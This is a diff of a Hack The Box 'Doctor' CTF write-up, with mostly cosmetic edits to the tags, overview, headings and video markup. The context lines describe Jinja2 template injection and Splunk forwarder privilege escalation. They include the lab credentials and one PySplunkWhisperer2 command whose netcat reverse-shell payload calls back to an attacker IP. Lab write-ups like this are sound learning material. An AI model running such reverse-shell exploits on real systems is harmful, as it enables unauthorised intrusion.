@@ -3,12 +3,12 @@ layout: post
 author: Siddhant Chouhan
 title: Hack The Box Doctor Writeup
 categories: [HackTheBox,Linux Machines]
-tags: [hackthebox, ctf, SSTI,flask,jinja2, creds, users, ssh, curl, john, splunk, password-reuse, hash]
+tags: [hackthebox, ctf, SSTI,flask,jinja2, creds, users, ssh, splunk, password-reuse]
 image: /assets/img/Posts/doctor.png
 ---
 ## Overview:
 
-The box starts with us finding a <code class="language-plaintext highlighter-rouge">python flask jinja 2 webapp</code> on port 80 and we have <code class="language-plaintext highlighter-rouge">splunk</code> running on port 8089 ,We do a <code class="language-plaintext highlighter-rouge">Server-Side Template Injection</code> to get remote code execution. We drop our public ssh key and get a shell on the box as the user web. Turns out the user web is part of the adm group which means we can read log files. We find a password in one of the log files and get a shell as the user shaun. We exploit Splunk Forwarder remotely using<code class="language-plaintext highlighter-rouge">SplunkWhisperer2</code> and we root the box.
+The box starts with us finding a <code class="language-plaintext highlighter-rouge">python flask jinja 2 webapp</code> on port 80 and we have <code class="language-plaintext highlighter-rouge">splunk</code> running on port 8089 ,We do a <code class="language-plaintext highlighter-rouge">Server-Side Template Injection</code> to get remote code execution. We drop our public ssh key and get a shell on the box as the user web. Turns out the user web is part of the adm group which means we can read log files. We find a password in one of the log files and get a shell as the user shaun. We exploit Splunk Forwarder remotely using<code class="language-plaintext highlighter-rouge">SplunkWhisperer2</code> with shaun's credentials and we root the box.
 
 ## Reconnaissance
 ### Nmap Scan
@@ -114,7 +114,7 @@ On googling about template injection in python flask we find that a framework ca
 
 > Server-Side Template Injection is possible when an attacker injects template directive as user input that can execute arbitrary code on the server. If you happen to view the source of a web page and see below code snippets then it is safe to guess that the application is using some template engine to render data.
 
-Create a new post and inject {{ 7*7 }} if we are able to inject code then this payload should get evaluated.
+Create a new post and inject "{{ 7*7 }}" if we are able to inject code then this payload should get evaluated.
 
 
   <img src="/assets/img/Posts/Doctor/testing-ssti.png" class="center">
@@ -192,7 +192,7 @@ shaun@doctor:~$ cat user.txt
 63918588bf664df1ff018a0dd5d9d436
 shaun@doctor:~$ 
 ```
-### Privilege Escalation
+## Privilege Escalation
 
 Not able to find any privilege escalation vectors, we can try logging in the splunk web app on port 8089 with the credentials
 shaun:Guitar123
@@ -207,8 +207,8 @@ On googling splunk privilege escalation, we get the following exploit.
 └──╼ $python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.25 --lport 2222 --username shaun --password Guitar123 --payload 'nc.traditional -e /bin/bash 10.10.14.25 4444'
 ```
 
-<video width='1024' height='768' controls autoplay> 
-    <source src="/assets/img/Posts/Doctor/pwned.mkv" type='video/x-matroska'>
+<video width='320' height='240' controls autoplay> 
+    <source src="/assets/img/Posts/Doctor/pwned.mkv" type='video/mp4'>
 </video>
 
 ```shell
